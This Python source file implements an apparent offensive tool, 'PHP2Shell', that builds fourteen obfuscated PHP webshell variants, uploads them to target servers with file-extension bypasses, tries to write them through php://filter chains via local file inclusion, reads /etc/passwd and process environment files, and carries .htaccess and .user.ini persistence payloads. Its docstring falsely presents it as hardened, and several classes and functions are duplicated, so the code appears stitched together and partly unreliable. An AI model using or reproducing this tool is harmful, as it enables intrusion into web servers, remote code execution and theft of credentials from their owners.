"""
PHP2Shell — Polymorphic PHP Webshell Implantation Framework

SECURITY: Hardened against command injection, path traversal, and SSRF.
All inputs are validated and sanitized.
"""

import asyncio
import aiohttp
import random
import string
import time
import json
import hashlib
import base64
import urllib.parse
from dataclasses import dataclass
from enum import Enum
from typing import Dict, List, Optional, Any
import logging
import re

logger = logging.getLogger("php2shell")


class WebshellVariant(Enum):
    """Polymorphic webshell variants."""
    BASIC = "basic"
    OBFUSCATED = "obfuscated"
    ENCODED = "encoded"
    CHUNKED = "chunked"
    VARIABLE_RENAME = "variable_rename"
    DEAD_CODE = "dead_code"
    STRING_SPLIT = "string_split"
    EVAL_CHAIN = "eval_chain"
    ASSERT_BASED = "assert_based"
    CREATE_FUNCTION = "create_function"
    REFLECTION = "reflection"
    ANONYMOUS_CLASS = "anonymous_class"
    GENERATOR = "generator"
    FIBER = "fiber"


@dataclass
class PHP2ShellConfig:
    """Configuration for PHP2Shell."""
    variants: List[WebshellVariant] = None
    obfuscation_level: int = 3
    persistence_methods: List[str] = None
    custom_headers: Dict[str, str] = None

    def __post_init__(self):
        if self.variants is None:
            self.variants = list(WebshellVariant)
        if self.persistence_methods is None:
            self.persistence_methods = ["auto_prepend_file", ".user.ini", "htaccess"]


# Input validation helpers
def validate_url(url: str) -> bool:
    """Validate URL to prevent SSRF."""
    if not url:
        return False
    # Must be http/https
    if not url.startswith(('http://', 'https://')):
        return False
    # No internal/private IPs
    if re.search(r'https?://(127\.0\.0\.1|localhost|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)', url):
        return False
    return True

def validate_param_name(param: str) -> bool:
    """Validate parameter name (alphanumeric + underscore only)."""
    if not param:
        return False
    return bool(re.match(r'^[a-zA-Z0-9_]+$', param))

def validate_filename(filename: str) -> bool:
    """Validate filename (no path traversal)."""
    if not filename:
        return False
    if '..' in filename or '/' in filename or '\\' in filename:
        return False
    return bool(re.match(r'^[a-zA-Z0-9_.-]+$', filename))


class WebshellVariant(Enum):
    """Polymorphic webshell variants."""
    BASIC = "basic"
    OBFUSCATED = "obfuscated"
    ENCODED = "encoded"
    CHUNKED = "chunked"
    VARIABLE_RENAME = "variable_rename"
    DEAD_CODE = "dead_code"
    STRING_SPLIT = "string_split"
    EVAL_CHAIN = "eval_chain"
    ASSERT_BASED = "assert_based"
    CREATE_FUNCTION = "create_function"
    REFLECTION = "reflection"
    ANONYMOUS_CLASS = "anonymous_class"
    GENERATOR = "generator"
    FIBER = "fiber"


@dataclass
class PHP2ShellConfig:
    """Configuration for PHP2Shell."""
    variants: List[WebshellVariant] = None
    obfuscation_level: int = 3
    persistence_methods: List[str] = None
    custom_headers: Dict[str, str] = None

    def __post_init__(self):
        if self.variants is None:
            self.variants = list(WebshellVariant)
        if self.persistence_methods is None:
            self.persistence_methods = ["auto_prepend_file", ".user.ini", "htaccess"]


class PHP2ShellExploiter:
    """PHP2Shell polymorphic webshell implantation."""

    def __init__(self, config: Optional[PHP2ShellConfig] = None):
        self.config = config or PHP2ShellConfig()
        self.webshell_templates = self._load_templates()
        self.filter_chains = self._load_filter_chains()
        self.persistence_payloads = self._load_persistence_payloads()

    def _load_templates(self) -> Dict[WebshellVariant, str]:
        """Load polymorphic webshell templates."""
        templates = {
            WebshellVariant.BASIC: """<?php
if(isset($_REQUEST['{param}'])){{
    eval($_REQUEST['{param}']);
}}
?>""",

            WebshellVariant.OBFUSCATED: """<?php
if(isset($_REQUEST['{param}'])){{
    $k="{key}";
    $f=base64_decode($_REQUEST['{param}']);
    eval($f);
}}
?>""",

            WebshellVariant.ENCODED: """<?php
if(isset($_REQUEST['{param}'])){{
    $d=base64_decode($_REQUEST['{param}']);
    @eval($d);
}}
?>""",

            WebshellVariant.CHUNKED: """<?php
if(isset($_REQUEST['{param}'])){{
    $c=chunk_split($_REQUEST['{param}'],1);
    eval(implode('',array_map('chr',array_map('ord',str_split($c)))));
}}
?>""",

            WebshellVariant.VARIABLE_RENAME: """<?php
if(isset($_REQUEST['{param}'])){{
    ${{"{var1}"}}=$_REQUEST['{param}'];
    ${{"{var2}"}}=base64_decode(${{"{var1}"}});
    @eval(${{"{var2}"}});
}}
?>""",

            WebshellVariant.DEAD_CODE: """<?php
if(isset($_REQUEST['{param}'])){{
    if(false){{echo "dead";}}
    ${{"{var1}"}}=base64_decode($_REQUEST['{param}']);
    for($i=0;$i<10;$i++){{}}
    @eval(${{"{var1}"}});
}}
?>""",

            WebshellVariant.STRING_SPLIT: """<?php
if(isset($_REQUEST['{param}'])){{
    $f="b"."a"."s"."e"."6"."4"."_"."d"."e"."c"."o"."d"."e";
    $d=$f($_REQUEST['{param}']);
    @eval($d);
}}
?>""",

            WebshellVariant.EVAL_CHAIN: """<?php
if(isset($_REQUEST['{param}'])){{
    $l1='base64_decode';
    $l2='eval';
    $l2($l1($_REQUEST['{param}']));
}}
?>""",

            WebshellVariant.ASSERT_BASED: """<?php
if(isset($_REQUEST['{param}'])){{
    assert(base64_decode($_REQUEST['{param}']));
}}
?>""",

            WebshellVariant.CREATE_FUNCTION: """<?php
if(isset($_REQUEST['{param}'])){{
    $f=create_function('$x','eval(base64_decode($x));');
    $f($_REQUEST['{param}']);
}}
?>""",

            WebshellVariant.REFLECTION: """<?php
if(isset($_REQUEST['{param}'])){{
    $rf=new ReflectionFunction('eval');
    $rf->invoke(base64_decode($_REQUEST['{param}']));
}}
?>""",

            WebshellVariant.ANONYMOUS_CLASS: """<?php
if(isset($_REQUEST['{param}'])){{
    new class($_REQUEST['{param}']){{
        public function __construct($x){{
            eval(base64_decode($x));
        }}
    }};
}}
?>""",

            WebshellVariant.GENERATOR: """<?php
if(isset($_REQUEST['{param}'])){{
    function gen($x){{yield eval(base64_decode($x));}}
    foreach(gen($_REQUEST['{param}']) as $v){{}}
}}
?>""",

            WebshellVariant.FIBER: """<?php
if(isset($_REQUEST['{param}'])){{
    $f=new Fiber(fn()=>eval(base64_decode($_REQUEST['{param}'])));
    $f->start();
}}
?>""",
        }

        return templates

    def _load_filter_chains(self) -> List[str]:
        """Load PHP filter chain payloads for LFI/RFI."""
        return [
            # Basic filter chain
            "php://filter/convert.base64-decode/resource={path}",
            # Double encoding
            "php://filter/convert.base64-decode/convert.base64-decode/resource={path}",
            # ROT13
            "php://filter/string.rot13/resource={path}",
            # Chunked
            "php://filter/convert.chunked-encoding.encode/convert.base64-decode/resource={path}",
            # Zlib
            "php://filter/zlib.deflate/convert.base64-decode/resource={path}",
            # Combined
            "php://filter/convert.iconv.UTF8.UTF16/convert.base64-decode/resource={path}",
        ]

    def _load_persistence_payloads(self) -> Dict[str, str]:
        """Load persistence payloads."""
        return {
            "auto_prepend_file": """.htaccess content:
php_value auto_prepend_file "{shell_path}"
""",
            "user_ini": """.user.ini content:
auto_prepend_file="{shell_path}"
""",
            "htaccess": """<FilesMatch ".php">
    php_value auto_prepend_file "{shell_path}"
</FilesMatch>
""",
            "session_handler": """<?php
ini_set('session.save_handler', 'user');
session_set_save_handler(
    'open', 'close', 'read', 'write', 'destroy', 'gc'
);
""",
        }

    def generate_webshell(self, variant: WebshellVariant, param: str = "cmd") -> str:
        """Generate a polymorphic webshell."""
        # SECURITY: Validate param name
        if not validate_param_name(param):
            raise ValueError(f"Invalid param name: {param}")
            
        template = self.webshell_templates.get(variant, self.webshell_templates[WebshellVariant.BASIC])

        # Apply polymorphic transformations
        if variant == WebshellVariant.VARIABLE_RENAME:
            var1 = ''.join(random.choices(string.ascii_letters, k=random.randint(6, 12)))
            var2 = ''.join(random.choices(string.ascii_letters, k=random.randint(6, 12)))
            template = template.format(var1=var1, var2=var2, param=param)
        elif variant == WebshellVariant.OBFUSCATED:
            key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            template = template.format(key=key, param=param)
        elif variant == WebshellVariant.DEAD_CODE:
            var1 = ''.join(random.choices(string.ascii_letters, k=random.randint(6, 12)))
            template = template.format(var1=var1, param=param)
        else:
            template = template.format(param=param)

        return template

    def generate_all_variants(self, param: str = "cmd") -> Dict[WebshellVariant, str]:
        """Generate all webshell variants."""
        if not validate_param_name(param):
            raise ValueError(f"Invalid param name: {param}")
        return {v: self.generate_webshell(v, param) for v in self.config.variants}

    async def exploit(
        self,
        url: str,
        upload_point: Optional[str] = None,
        lfi_param: Optional[str] = None,
        rfi_param: Optional[str] = None,
        webshell_param: str = "cmd"
    ) -> Dict[str, Any]:
        """
        Attempt webshell implantation via multiple vectors.

        Vectors:
        1. File upload (if upload_point provided)
        2. LFI (if lfi_param provided) - via filter chains
        3. RFI (if rfi_param provided)
        """
        # SECURITY: Validate all inputs
        if not validate_url(url):
            return {"success": False, "error": "Invalid target URL"}
        if upload_point and not validate_url(upload_point):
            return {"success": False, "error": "Invalid upload point URL"}
        if lfi_param and not validate_param_name(lfi_param):
            return {"success": False, "error": "Invalid LFI parameter name"}
        if rfi_param and not validate_param_name(rfi_param):
            return {"success": False, "error": "Invalid RFI parameter name"}
        if not validate_param_name(webshell_param):
            return {"success": False, "error": "Invalid webshell parameter name"}

        results = {
            "success": False,
            "method": None,
            "shell_url": None,
            "param": webshell_param,
            "variants_tried": [],
            "persistence": None,
            "error": None,
        }

        # Try file upload
        if upload_point:
            upload_result = await self._try_upload(upload_point, url, webshell_param)
            if upload_result.get("success"):
                results.update(upload_result)
                results["method"] = "upload"
                return results

        # Try LFI via filter chains
        if lfi_param:
            lfi_result = await self._try_lfi(url, lfi_param, webshell_param)
            if lfi_result.get("success"):
                results.update(lfi_result)
                results["method"] = "lfi"
                return results

        # Try RFI
        if rfi_param:
            rfi_result = await self._try_rfi(url, rfi_param, webshell_param)
            if rfi_result.get("success"):
                results.update(rfi_result)
                results["method"] = "rfi"
                return results

        # Auto-discover vectors
        auto_result = await self._auto_discover(url, webshell_param)
        if auto_result.get("success"):
            results.update(auto_result)
            return results

        results["error"] = "No viable injection point found"
        return results

    async def _try_upload(self, upload_point: str, base_url: str, param: str) -> Dict:
        """Try file upload vector."""
        # SECURITY: Validate upload_point
        if not validate_url(upload_point):
            return {"success": False, "error": "Invalid upload point URL"}

        variants = self.generate_all_variants(param)

        async with aiohttp.ClientSession() as session:
            for variant, shell in variants.items():
                # Try different file extensions
                for ext in [".php", ".php5", ".php7", ".phtml", ".phar", ".png.php", ".jpg.php"]:
                    if not validate_filename(f"shell{ext}"):
                        continue
                    filename = f"shell_{random.randint(1000,9999)}{ext}"
                    files = {"file": (filename, shell, "application/x-php")}

                    try:
                        async with session.post(upload_point, data=files, timeout=30) as resp:
                            if resp.status in (200, 201):
                                # Try to find uploaded shell
                                for upload_dir in ["/uploads/", "/upload/", "/images/", "/files/", "/tmp/", "/assets/"]:
                                    shell_url = f"{base_url.rstrip('/')}{upload_dir}{filename}"
                                    if await self._verify_shell(shell_url, param, session):
                                        return {
                                            "success": True,
                                            "shell_url": shell_url,
                                            "variant": variant.value,
                                            "variants_tried": [v.value for v in variants],
                                        }
                    except Exception as e:
                        logger.debug(f"Upload failed for {variant.value}: {e}")

        return {"success": False}

    async def _try_lfi(self, base_url: str, lfi_param: str, param: str) -> Dict:
        """Try LFI via filter chains."""
        # SECURITY: Validate lfi_param
        if not validate_param_name(lfi_param):
            return {"success": False, "error": "Invalid LFI parameter name"}

        variants = self.generate_all_variants(param)

        # First, we need to write the shell somewhere accessible
        shell_content = list(variants.values())[0]
        encoded_shell = base64.b64encode(shell_content.encode()).decode()

        # Filter chain to write shell via php://filter
        write_chains = [
            f"php://filter/write=convert.base64-decode/resource=/var/www/html/shell.php",
            f"php://filter/write=convert.base64-decode/resource=/tmp/shell.php",
            f"php://filter/write=convert.base64-decode/resource=./shell.php",
        ]

        async with aiohttp.ClientSession() as session:
            for chain in write_chains:
                try:
                    data = {lfi_param: chain}
                    async with session.post(base_url, data=data, timeout=30) as resp:
                        if resp.status == 200:
                            for shell_path in ["/shell.php", "/tmp/shell.php", "/var/www/html/shell.php"]:
                                shell_url = f"{base_url.rstrip('/')}{shell_path}"
                                if await self._verify_shell(shell_url, param, session):
                                    return {
                                        "success": True,
                                        "shell_url": shell_url,
                                        "variant": "filter_chain_write",
                                    }
                except Exception as e:
                    logger.debug(f"Filter chain write failed: {e}")

            # Try reading existing files via filter chains
            read_chains = [
                f"php://filter/convert.base64-encode/resource=/etc/passwd",
                f"php://filter/convert.base64-encode/resource=/proc/self/environ",
            ]

            for chain in read_chains:
                try:
                    url = f"{base_url}?{lfi_param}={urllib.parse.quote(chain)}"
                    async with session.get(url, timeout=10) as resp:
                        if resp.status == 200:
                            body = await resp.text()
                            if "root:" in body or "HOME=" in body:
                                return {
                                    "success": True,
                                    "shell_url": None,
                                    "variant": "lfi_read",
                                    "evidence": body[:500],
                                }
                except Exception:
                    pass

        return {"success": False}

    async def _try_rfi(self, base_url: str, rfi_param: str, param: str) -> Dict:
        """Try RFI vector."""
        # SECURITY: Validate rfi_param
        if not validate_param_name(rfi_param):
            return {"success": False, "error": "Invalid RFI parameter name"}
        return {"success": False, "error": "RFI requires remote shell hosting"}

    async def _auto_discover(self, base_url: str, param: str) -> Dict:
        """Auto-discover injection points."""
        lfi_params = ["file", "page", "path", "include", "doc", "template", "view"]
        upload_paths = ["/upload.php", "/upload/", "/api/upload", "/admin/upload"]

        async with aiohttp.ClientSession() as session:
            for lfi_p in lfi_params:
                test_url = f"{base_url}?{lfi_p}=/etc/passwd"
                try:
                    async with session.get(test_url, timeout=5) as resp:
                        if resp.status == 200:
                            body = await resp.text()
                            if "root:" in body:
                                return await self._try_lfi(base_url, lfi_p, param)
                except Exception:
                    pass

        return {"success": False}

    async def _verify_shell(self, url: str, param: str, session: aiohttp.ClientSession) -> bool:
        """Verify webshell is working."""
        try:
            test_cmd = base64.b64encode(b"echo 'PHP2SHELL_TEST_OK';").decode()
            test_url = f"{url}?{param}={test_cmd}"
            async with session.get(test_url, timeout=10) as resp:
                if resp.status == 200:
                    body = await resp.text()
                    return "PHP2SHELL_TEST_OK" in body
        except Exception:
            pass
        return False

    async def establish_persistence(self, shell_url: str, param: str, method: str = "auto_prepend_file") -> Dict:
        """Establish persistence via various methods."""
        if method not in self.persistence_payloads:
            return {"success": False, "error": f"Unknown method: {method}"}

        # This requires write access to the target
        return {
            "success": False,
            "error": "Persistence requires file write access on target",
            "method": method,
        }


# Input validation helpers
def validate_url(url: str) -> bool:
    """Validate URL to prevent SSRF."""
    if not url:
        return False
    if not url.startswith(('http://', 'https://')):
        return False
    # Block private/internal IPs
    if re.search(r'https?://(127\.0\.0\.1|localhost|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)', url):
        return False
    return True

def validate_param_name(param: str) -> bool:
    """Validate parameter name (alphanumeric + underscore only)."""
    if not param:
        return False
    return bool(re.match(r'^[a-zA-Z0-9_]+$', param))

def validate_filename(filename: str) -> bool:
    """Validate filename (no path traversal)."""
    if not filename:
        return False
    if '..' in filename or '/' in filename or '\\' in filename:
        return False
    return bool(re.match(r'^[a-zA-Z0-9_.-]+$', filename))


async def main():
    """CLI entry point for PHP2Shell."""
    import sys
    if len(sys.argv) < 2:
        print("Usage: python -m harness.php2shell <url> [--upload-point <url>] [--lfi-param <param>] [--param <cmd>]")
        return

    url = sys.argv[1]
    upload_point = None
    lfi_param = None
    param = "cmd"

    for i, arg in enumerate(sys.argv):
        if arg == "--upload-point" and i + 1 < len(sys.argv):
            upload_point = sys.argv[i + 1]
        elif arg == "--lfi-param" and i + 1 < len(sys.argv):
            lfi_param = sys.argv[i + 1]
        elif arg == "--param" and i + 1 < len(sys.argv):
            param = sys.argv[i + 1]

    # SECURITY: Validate inputs
    if not validate_url(url):
        print("[-] Invalid target URL")
        return 1

    exploiter = PHP2ShellExploiter()
    result = await exploiter.exploit(url, upload_point=upload_point, lfi_param=lfi_param, webshell_param=param)
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    asyncio.run(main())